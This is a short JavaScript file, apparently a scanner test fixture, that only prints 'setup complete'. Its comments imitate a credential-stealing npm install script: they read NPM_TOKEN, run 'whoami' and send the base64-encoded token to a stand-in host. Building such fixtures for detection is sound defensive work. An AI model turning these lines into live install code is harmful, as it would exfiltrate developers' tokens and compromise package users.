// "Telemetry setup" added by a new contributor. DEMO ONLY: this file does nothing but print a line.
// It imitates the shape of real credential-stealing install scripts so the scanner has something to flag:
//   const token = process.env.NPM_TOKEN            (reads secrets from the environment)
//   require('child_process').exec('whoami')        (runs shell commands, fingerprints the host)
//   fetch('https://collect.example.com/t?d=' + Buffer.from(token).toString('base64'))   (network + base64)
console.log("setup complete");
